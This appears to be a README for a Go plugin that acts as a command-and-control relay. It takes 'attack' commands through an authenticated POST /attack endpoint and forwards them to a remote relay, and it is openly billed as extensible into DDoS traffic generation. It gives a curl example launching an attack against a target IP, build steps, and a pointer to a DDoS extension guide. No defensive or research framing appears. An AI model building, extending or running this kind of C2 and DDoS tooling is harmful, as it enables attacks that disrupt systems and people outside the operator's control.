# C2-Relay Plugin for Sentinel V5

A lightweight, secure C2 (Command‑and‑Control) relay that receives `attack` requests via a dedicated API endpoint, validates them, and forwards the payload to the Sentinel V5 relay. This plugin is designed to be a **C2‑DDoS** plugin: it can act as a low‑latency command forwarder and can be extended to perform DDoS‑style traffic generation.

## Overview

- **Purpose** – Accept `attack` commands from external systems and forward them to the C2‑Relay.  
- **Endpoint** – `POST /attack` on the `c2-relay` service.  
- **Authentication** – Uses Bearer token (in the `Authorization` header) and optional `X-Api-Key`.  
- **Extensions** – Can be extended to accept optional `ddos` payload, but the core is a simple forwarder.

## API Contract

| Method | Path | Description | Payload |
|--------|------|-------------|---------|
| `POST` | `/attack` | Receive an attack command and forward it to the relay. | `{ "command": string, "payload": string, "metadata": map[string]string }` |

**Example Request**

```sh
curl -X POST \
  -H "Authorization: Bearer <relay-token>" \
  -d ’{"command":"launch","payload":"{\"attack\":true,\"target\":\"192.168.1.10\"}", "metadata":{"source":"discord","ts":"2026-10-27T22:00:00Z"}}’ \
  https://your-relay.com/api/attack
```

**Response**

```json
{
  "status": "ok",
  "message": "Attack command received and forwarded",
  "timestamp": "2026-10-27T22:00:00Z"
}
```

## Plugin Architecture

```
┌─────────────────────┐
│  c2-relay plugin   │
├─────────────────────┤
│  • API endpoint    │
│  • Validator       │
│  • Forwarder      │
├─────────────────────┤
│  • Relay service   │
└─────────────────────┘
```

1. **API endpoint** – Handles `POST /attack`.  
2. **Validator** – Validates the payload, ensures required fields are present.  
3. **Forwarder** – Sends the payload to the remote relay via HTTP.  
4. **Relay service** – The target service that receives the forwarded payload.

## Directory Layout

```
F:\sentinel all\sentinel-v5-plugins\plugins\c2-relay
├── README.md
├── relay.go
├── api.go
├── validator.go
└── forwarder.go
```

## Build & Run

```sh
cd F:\sentinel all\sentinel-v5-plugins\plugins\c2-relay
go build -o c2-relay.exe
```

The binary should be deployed to the `c2-relay` service and exposed at `https://your-relay.com/api/attack`.

## Extending to DDoS

To add a DDoS layer, extend the `payload` structure to include a `ddos` field and add a `ddos` handler in `forwarder.go`. See the `ddos` extension guide in `F:\sentinel all\sentinel-v5-plugins\docs\ddos.md`.

---

**Author:** Amped  
**License:** MIT
